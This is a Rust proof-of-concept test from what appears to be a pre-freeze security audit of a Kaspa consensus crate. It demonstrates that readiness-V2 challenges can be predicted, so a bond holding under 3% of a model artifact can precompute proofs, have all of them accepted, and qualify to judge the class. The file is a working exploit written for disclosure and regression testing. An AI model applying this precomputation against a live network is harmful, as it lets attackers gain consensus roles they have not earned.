//! # MSK-26A-PALW-04 — the readiness-V2 challenge seed H(class, bond, span) is predictable ahead
//! # of the span, so a bond can precompute its drawn leaves and pass readiness while holding only
//! # a small fraction of the artifact.
//!
//! Audit commit : 3d2bd6dc5d77d37396d1b73c4c13526090923b92
//! Crate        : kaspa-consensus-core (consensus/core)
//! Command      :
//!   cp docs/security/audits/2026-09-claude-pre-freeze/poc/MSK-26A-PALW-04.rs \
//!      consensus/core/tests/audit_poc_msk_26a_palw_04.rs \
//!   && cargo test -p kaspa-consensus-core --test audit_poc_msk_26a_palw_04 -- --nocapture ; \
//!   rm consensus/core/tests/audit_poc_msk_26a_palw_04.rs
//!
//! PASS = the vulnerable behaviour is present: a bond that, at an EARLY chain state, computed the
//! V2 challenge draws for a set of FUTURE spans, kept only those operands (well under 1% of the
//! artifact) and discarded the rest, later has every one of those proofs accepted by the real
//! state transition (`apply_palw_transition_v2_with_extras` -> `apply_seat_readiness_v2`), gets a
//! `proof_version = 2` readiness row, is counted fresh by `palw_readiness_row_is_fresh_v1` for
//! testnet-12's 24-span horizon, and is admitted to judge the class by
//! `palw_bond_may_judge_class_v4` — while it cannot answer the challenge of essentially any span it
//! did not precompute (i.e. it demonstrably does NOT hold the artifact). The test FAILS once the
//! seed carries chain randomness unknown before the span (the precomputed draws would no longer be
//! the ones the fold checks, so the proofs would be refused).
//!
//! Reachability is read at runtime from `palw_t12_shipped_params()` (registry + readiness V2 armed
//! at DAA 0, 24-span horizon, one-DAA execution spans) and `mainnet_shipped_params()` (registry and
//! readiness V2 `None`: dormant). The state fixture is a minimal network (base class + one model
//! class whose artifact root the test controls + bonds); the fold is given testnet-12's span length
//! and registry globals. The rule exercised (`apply_seat_readiness_v2`) reads only the class's
//! artifact root, the bond's status, the span/landing window and the seed — none of which the
//! fixture changes relative to testnet-12.

use std::collections::BTreeMap;

use kaspa_consensus_core::config::params::{ForkActivation, mainnet_shipped_params, palw_t12_shipped_params};
use kaspa_consensus_core::palw_artifact::{
    PalwArtifactOperandV1, artifact_leaf_v1, artifact_root_v1, palw_artifact_multiproof_v1, verify_artifact_multiproof_v1,
};
use kaspa_consensus_core::palw_execution_lane_v1::PalwExecLaneFoldV1;
use kaspa_consensus_core::palw_mode_v2::PalwConsensusMode;
use kaspa_consensus_core::palw_model_registry_v1::{
    PALW_READINESS_V2_BUDGET_BYTES_V1, PALW_READINESS_V2_CHUNKS_V1, PalwModelRegistryFoldV1, PalwModelWorkV1,
    PalwReadinessPolicyV1, palw_readiness_landing_spans_v1, palw_readiness_row_is_fresh_v1, palw_readiness_v2_challenge_seed_v1,
    palw_readiness_v2_draw_v1, palw_registry_globals_of_bundle_v1,
};
use kaspa_consensus_core::palw_state_v2::{
    PalwBlockContextV2, PalwBondKeyV2, PalwChainStateV2, PalwConsensusObjectV2, PalwPwuRuleV2, PalwStateParamsV2,
    PalwTransitionExtrasV1, apply_palw_transition_v2_with_extras, palw_bond_may_judge_class_v4,
};
use kaspa_consensus_core::tx::{TransactionId, TransactionOutpoint};
use kaspa_hashes::Hash64;

const LEAVES: u32 = 20_000;
const LEAF_BYTES: usize = 256;

fn h(v: u64) -> Hash64 {
    Hash64::from_u64_word(v)
}
fn bond_key(v: u64) -> PalwBondKeyV2 {
    PalwBondKeyV2(TransactionOutpoint { transaction_id: TransactionId::from_u64_word(v), index: 0 })
}
fn ctx(block: u64, daa: u64) -> PalwBlockContextV2 {
    PalwBlockContextV2 { block: h(0xB000 + block), daa_score: daa, blue_score: block, subsidy: 0 }
}
fn base_id() -> Hash64 {
    h(1)
}
fn model_id() -> Hash64 {
    h(2)
}

/// The fixture state params (the crate's own registry fixture shape).
fn state_params() -> PalwStateParamsV2 {
    PalwStateParamsV2::new(100, 10, 40, 20, 500, 1000, base_id(), 4, 1000, 100, 1000, 0).unwrap().with_fp_quanta(8, 64).unwrap()
}

fn operand(i: u32) -> PalwArtifactOperandV1 {
    // Deterministic, per-leaf distinct bytes.
    let mut bytes = vec![0u8; LEAF_BYTES];
    for (k, b) in bytes.iter_mut().enumerate() {
        *b = (i as u64).wrapping_mul(0x9E37_79B9).wrapping_add(k as u64).to_le_bytes()[k % 8];
    }
    PalwArtifactOperandV1 { tensor_name: "w".to_string(), layer: None, row_start: i * LEAF_BYTES as u32, bytes }
}

fn network(root: Hash64) -> Vec<PalwConsensusObjectV2> {
    let mut objects = vec![
        PalwConsensusObjectV2::ClassRegistered {
            class_id: base_id(),
            artifact_root: h(11),
            slash_value_per_pwu: 5,
            pwu_rule: PalwPwuRuleV2::MaxPerAttempt(160),
            initial_target: u128::MAX / 2,
            share_permille: 1000,
            activation_daa: 0,
            admission: None,
        },
        PalwConsensusObjectV2::ClassRegistered {
            class_id: model_id(),
            artifact_root: root,
            slash_value_per_pwu: 5,
            pwu_rule: PalwPwuRuleV2::MaxPerAttempt(160),
            initial_target: u128::MAX / 2,
            share_permille: 0,
            activation_daa: 0,
            admission: None,
        },
    ];
    for n in 1..=8u64 {
        objects.push(PalwConsensusObjectV2::BondRegistered {
            bond: bond_key(n),
            pubkey: vec![0x40 + n as u8; 4],
            operator_pubkey: vec![20 + n as u8; 8],
            collateral: 1_000,
            payout_payload: Hash64::from_u64_word(0x9A00 + n),
            capable_classes: Default::default(),
            signature: Vec::new(),
        });
    }
    objects
}

#[test]
fn msk_26a_palw_04_precomputed_readiness_v2_passes_without_the_artifact() {
    // ---- 1. Reachability, read at runtime from the shipped constructors. ----------------------
    let t12 = palw_t12_shipped_params();
    assert_eq!(t12.palw_model_registry, Some(ForkActivation::always()), "t12: registry armed at DAA 0");
    assert!(t12.palw_readiness_v2_at(0), "t12: readiness V2 armed at DAA 0");
    assert_eq!(t12.palw_readiness_v2_max_age_spans_v1(), 24, "t12: 24-span readiness horizon");
    let span_daa = t12.palw_execution_lane.expect("t12 arms the execution lane").schedule_span_daa;
    assert_eq!(span_daa, 1, "t12: one-DAA execution spans");
    let pool = t12.palw_activation_pool.expect("t12 arms the Activation Pool");
    println!("t12: palw_activation_pool = {pool:?}");
    let bundle = match &t12.palw_consensus_mode {
        PalwConsensusMode::ConsensusV2(b) => b.clone(),
        _ => panic!("t12 is a ConsensusV2 network"),
    };
    let globals = palw_registry_globals_of_bundle_v1(&bundle);
    assert_eq!(globals.readiness_v2_max_age_spans, 24);
    let landing = palw_readiness_landing_spans_v1(span_daa);
    println!("t12: span_daa={span_daa} readiness_v2_max_age_spans=24 landing_spans={landing}");
    let main = mainnet_shipped_params();
    println!(
        "mainnet preset: palw_model_registry={:?} palw_readiness_v2={:?} (dormant)",
        main.palw_model_registry, main.palw_readiness_v2
    );
    assert!(main.palw_model_registry.is_none() && main.palw_readiness_v2.is_none(), "mainnet: dormant");

    // ---- 2. The artifact, and the class that registers its root. -------------------------------
    let full: Vec<PalwArtifactOperandV1> = (0..LEAVES).map(operand).collect();
    let leaf_hashes: Vec<Hash64> = full.iter().map(artifact_leaf_v1).collect();
    let root = artifact_root_v1(&leaf_hashes).unwrap();

    let fold = PalwModelRegistryFoldV1 {
        globals,
        span_daa,
        genesis_works: {
            let mut w = BTreeMap::new();
            w.insert(
                base_id(),
                PalwModelWorkV1 { verification_ccu: 1_000, economic_ccu_per_claim: 500, ops_supported: true, ..Default::default() },
            );
            w.insert(
                model_id(),
                PalwModelWorkV1 {
                    verification_ccu: 1_000_000,
                    economic_ccu_per_claim: 800_000,
                    artifact_bytes: (LEAVES as u64) * LEAF_BYTES as u64,
                    working_set_bytes: (LEAVES as u64) * LEAF_BYTES as u64,
                    ops_supported: true,
                },
            );
            w
        },
        grace_until_daa: 0,
        admission_audit_period_daa: None,
        readiness_v2_active: true,
    };
    let extras = PalwTransitionExtrasV1 {
        round_lane: Some(PalwExecLaneFoldV1 { schedule_span_daa: span_daa, ..Default::default() }),
        model_registry: Some(fold.clone()),
        readiness_v2_active: true,
        ..Default::default()
    };
    let p = state_params();
    let apply = |parent: &PalwChainStateV2, c: &PalwBlockContextV2, objects: &[PalwConsensusObjectV2]| {
        apply_palw_transition_v2_with_extras(parent, &p, c, objects, None, false, false, false, false, &extras)
    };

    let (s1, _) = apply(&PalwChainStateV2::genesis(), &ctx(1, 100), &network(root)).expect("network registers");
    let (mut state, _) = apply(&s1, &ctx(2, 101), &[]).expect("an empty block");

    // ---- 3. EARLY (chain at span 101): the attacker precomputes FUTURE challenges. -------------
    let attacker = bond_key(2);
    let attacker_bytes = borsh::to_vec(&attacker).unwrap();
    let now_span = 101u64;
    // One proof every 24 spans keeps a 24-span row continuously fresh: 25 proofs = 600 spans ahead.
    let targets: Vec<u64> = (0..25u64).map(|k| 1_000 + 24 * k).collect();
    assert!(targets.iter().all(|t| *t > now_span + landing), "every target span is in the future, beyond any landing window");
    let mut kept: BTreeMap<u32, PalwArtifactOperandV1> = BTreeMap::new();
    let mut draws: BTreeMap<u64, Vec<u32>> = BTreeMap::new();
    for &t in &targets {
        let seed = palw_readiness_v2_challenge_seed_v1(&model_id(), &attacker_bytes, t);
        let draw = palw_readiness_v2_draw_v1(&seed, LEAVES);
        assert_eq!(draw.len(), PALW_READINESS_V2_CHUNKS_V1 as usize);
        for i in &draw {
            kept.insert(*i, full[*i as usize].clone());
        }
        draws.insert(t, draw);
    }
    // Discard the artifact's operand bytes: only `kept` (and the 64-byte leaf hashes) remain.
    drop(full);
    let f = kept.len() as f64 / LEAVES as f64;
    let kept_bytes: usize = kept.values().map(|o| o.bytes.len()).sum();
    println!(
        "attacker keeps {} of {} leaves (f = {:.4}, {} operand bytes of {}); ADR-0133 §11.2 bound f^16 = {:.3e}",
        kept.len(),
        LEAVES,
        f,
        kept_bytes,
        LEAVES as usize * LEAF_BYTES,
        f.powi(16)
    );
    assert!(f < 0.03, "the attacker holds well under 3% of the artifact");
    // 16 x 256 = 4,096 bytes is below the 26,272-byte budget, so the prefix rule owes all 16 leaves.
    assert!(16 * LEAF_BYTES < PALW_READINESS_V2_BUDGET_BYTES_V1);

    // Proof builder that can ONLY use what the attacker kept.
    let build = |t: u64| -> Option<PalwConsensusObjectV2> {
        let seed = palw_readiness_v2_challenge_seed_v1(&model_id(), &attacker_bytes, t);
        let draw = palw_readiness_v2_draw_v1(&seed, LEAVES);
        let opened: Option<Vec<(u32, PalwArtifactOperandV1)>> = draw.iter().map(|i| kept.get(i).map(|o| (*i, o.clone()))).collect();
        let proof = palw_artifact_multiproof_v1(&leaf_hashes, &opened?)?;
        Some(PalwConsensusObjectV2::SeatReadinessProvedV2 {
            bond: attacker,
            class_id: model_id(),
            span: t,
            proof: Box::new(proof),
            // The acceptance layer checks the bond's own ML-DSA-87 signature over
            // palw_seat_readiness_message_v2; the attacker holds its bond key, so it can always sign.
            signature: vec![1],
        })
    };

    // Sanity: the attacker does NOT hold the artifact — it cannot answer spans it did not precompute.
    let mut unprecomputed_provable = 0u32;
    let probe = 2_000u64;
    for t in 1_000..1_000 + probe {
        if !draws.contains_key(&t) && build(t).is_some() {
            unprecomputed_provable += 1;
        }
    }
    println!("of {probe} spans it did not precompute, the attacker can prove {unprecomputed_provable}");
    assert_eq!(unprecomputed_provable, 0, "it genuinely lacks the artifact");

    // ---- 4. LATER: the chain reaches each target span; every precomputed proof is accepted. ----
    let mut block = 3u64;
    let mut accepted = 0u32;
    for &t in &targets {
        let daa = t * span_daa; // the proof lands in its own span
        let object = build(t).expect("the attacker kept exactly this span's leaves");
        if let PalwConsensusObjectV2::SeatReadinessProvedV2 { proof, .. } = &object {
            verify_artifact_multiproof_v1(proof, root).expect("the multiproof reconstructs the registered root");
            assert_eq!(proof.opened.len(), 16);
        }
        let (next, _) = apply(&state, &ctx(block, daa), &[object]).unwrap_or_else(|e| panic!("span {t}: fold refused: {e:?}"));
        block += 1;
        let row = *next.seat_readiness(&attacker, &model_id()).expect("a readiness row is written");
        assert_eq!((row.proof_version, row.proved_span, row.chunks), (2, t, 16), "a V2 row, 16 chunks, for span {t}");
        // Counted fresh by the ONE predicate every judge of a row asks, for the whole 24-span horizon.
        assert!(palw_readiness_row_is_fresh_v1(&row, daa + 24 * span_daa, span_daa, &globals, true));
        assert!(!palw_readiness_row_is_fresh_v1(&row, daa + 25 * span_daa, span_daa, &globals, true));
        // And the draw's predicate admits the bond to judge the model class.
        let policy = PalwReadinessPolicyV1::at(&fold, daa + 23 * span_daa, base_id(), true);
        let record = next.bond(&attacker).expect("the bond").clone();
        assert!(palw_bond_may_judge_class_v4(&next, &attacker, &record, &model_id(), false, Some(policy)));
        state = next;
        accepted += 1;
    }
    println!(
        "accepted {accepted}/{} precomputed V2 proofs, computed at span {now_span}, covering spans {}..={} ({} spans of continuous readiness)",
        targets.len(),
        targets[0],
        targets[targets.len() - 1] + 24,
        targets.len() as u64 * 24
    );
    assert_eq!(accepted as usize, targets.len(), "VULNERABLE: every precomputed proof passes the fold");

    // ---- 5. Minimal holder: 16 leaves (4,096 operand bytes) for ONE chosen future span. --------
    let chosen = 5_000u64;
    let seed = palw_readiness_v2_challenge_seed_v1(&model_id(), &attacker_bytes, chosen);
    let draw = palw_readiness_v2_draw_v1(&seed, LEAVES);
    let only16: Vec<(u32, PalwArtifactOperandV1)> = draw.iter().map(|i| (*i, operand(*i))).collect();
    let proof = palw_artifact_multiproof_v1(&leaf_hashes, &only16).unwrap();
    println!("a holder of just {} operand bytes proves span {chosen}", proof.operand_bytes());
    let obj = PalwConsensusObjectV2::SeatReadinessProvedV2 {
        bond: attacker,
        class_id: model_id(),
        span: chosen,
        proof: Box::new(proof),
        signature: vec![1],
    };
    let (last, _) = apply(&state, &ctx(block, chosen * span_daa), &[obj]).expect("VULNERABLE: 16 precomputed leaves suffice");
    assert_eq!(last.seat_readiness(&attacker, &model_id()).unwrap().proved_span, chosen);
}
